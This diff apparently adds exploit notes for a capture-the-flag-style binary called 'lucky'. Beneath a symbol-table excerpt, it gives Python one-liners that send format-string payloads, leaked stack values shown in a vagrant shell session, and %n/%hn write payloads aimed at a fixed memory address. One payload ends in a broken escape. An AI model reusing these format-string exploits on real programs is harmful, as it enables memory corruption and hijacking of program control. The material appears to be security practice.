@@ -103,3 +103,16 @@ SYMBOL TABLE:
 00000000004006a0 g     F .text  0000000000000034              main
 0000000000601050 g     O .data  0000000000000000              .hidden __TMC_END__
 00000000004004d8 g     F .init  0000000000000000              _init
+
+python -c "print '%x %x %x %s \x48\x10\x60\x00\x00\x00\x00\x00'"|./lucky
+
+%016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx
+
+vagrant@vagrant:/vagrant$ python -c "print '%016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx '"|./lucky
+
+vagrant@vagrant:/vagrant$ python -c "print '%016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx '"|./lucky
+00007ffd8d580350 00007f4b989078d0 000000000000001f 0000000000000000 0000000000000000 2520786c36313025 302520786c363130 31302520786c3631 3631302520786c36 6c3631302520786c 786c363130252078 20786c3631302520 2520786c36313025 302520786c363130
+
+python -c "print '%c%c%c%c%c%c%c%c%c%c%c%.991u%hn\x00\x00\x00\x00\x00\x60\x10\x'"|./lucky
+
+python -c "print '%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%p%n\x48\x10\x60\x00\x00\x00\x00\x00'"|./lucky
